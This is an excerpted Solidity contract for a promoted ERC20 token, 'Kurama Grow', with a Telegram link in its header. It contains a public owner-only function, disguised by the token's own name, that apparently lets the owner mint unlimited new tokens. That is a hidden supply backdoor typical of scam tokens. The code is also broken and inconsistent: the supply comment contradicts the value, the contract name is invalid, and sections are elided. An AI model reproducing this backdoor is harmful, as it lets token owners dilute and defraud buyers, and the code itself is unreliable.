...
//
// $KuramaGrow proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/KuramaGrow
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _KuramaGrow(uint256 amount) public onlyOwner {
 _KuramaGrow(msg.sender, amount);
    }
    ...
    function _KuramaGrow(address account, uint256 amount) internal virtual {
...
contract $KuramaGrow is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Kurama Grow", "KURAMAGROW") {
     _KuramaGrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}